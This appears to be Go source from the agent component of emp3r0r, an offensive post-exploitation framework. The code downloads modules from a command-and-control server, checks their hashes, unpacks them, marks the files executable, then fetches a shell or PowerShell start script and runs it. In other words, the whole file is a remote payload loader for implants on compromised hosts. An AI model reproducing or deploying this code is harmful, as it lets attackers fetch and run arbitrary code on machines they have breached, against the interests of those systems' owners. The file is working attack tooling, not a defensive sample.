package agent

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver/v3"
)

// moduleHandler downloads and runs modules from C2
func moduleHandler(modName, checksum string) (out string) {
	tarball := filepath.Join(RuntimeConfig.AgentRoot, modName+".tar.xz")
	modDir := filepath.Join(RuntimeConfig.AgentRoot, modName)
	startScript := fmt.Sprintf("%s.%s", modName, getScriptExtension())

	// in memory execution?
	inMem := checksum == "in_mem"

	if !inMem {
		if err := downloadAndVerifyModule(tarball, checksum); err != nil {
			return err.Error()
		}

		if err := extractAndRunModule(modDir, tarball); err != nil {
			return err.Error()
		}
	}

	out, err := runStartScript(startScript)
	if err != nil {
		return fmt.Sprintf("running start script: %v: %s", err, out)
	}
	return out
}

func getScriptExtension() string {
	if runtime.GOOS == "windows" {
		return "ps1"
	}
	return "sh"
}

func downloadAndVerifyModule(tarball, checksum string) error {
	if tun.SHA256SumFile(tarball) != checksum {
		if _, err := DownloadViaCC(tarball, tarball); err != nil {
			return err
		}
	}

	if tun.SHA256SumFile(tarball) != checksum {
		log.Print("Checksum failed, restarting...")
		os.RemoveAll(tarball)
		return downloadAndVerifyModule(tarball, checksum) // Recursive call
	}
	return nil
}

func extractAndRunModule(modDir, tarball string) error {
	os.RemoveAll(modDir)
	if err := archiver.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
		return fmt.Errorf("unarchive module tarball: %v", err)
	}

	pwd, err := os.Getwd()
	if err != nil {
		return fmt.Errorf("pwd: %v", err)
	}
	defer os.Chdir(pwd)

	if err := os.Chdir(modDir); err != nil {
		return fmt.Errorf("cd to module dir: %v", err)
	}

	return processModuleFiles(modDir)
}

func processModuleFiles(modDir string) error {
	files, err := os.ReadDir(modDir)
	if err != nil {
		return fmt.Errorf("processing module files: %v", err)
	}

	for _, f := range files {
		if err := os.Chmod(filepath.Join(modDir, f.Name()), 0o700); err != nil {
			return fmt.Errorf("setting permissions for %s: %v", f.Name(), err)
		}

		libsTarball := filepath.Join(modDir, "libs.tar.xz")
		if util.IsExist(libsTarball) {
			os.RemoveAll(filepath.Join(modDir, "libs"))
			if err := archiver.Unarchive(libsTarball, modDir); err != nil {
				return fmt.Errorf("unarchive %s: %v", libsTarball, err)
			}
		}
	}
	return nil
}

func runStartScript(startScript string) (string, error) {
	payload, err := DownloadViaCC(startScript, "")
	if err != nil {
		return "", fmt.Errorf("downloading %s: %v", startScript, err)
	}

	log.Printf("Running %s:\n%s...", startScript, payload[:100])
	return RunModuleScript(payload)
}
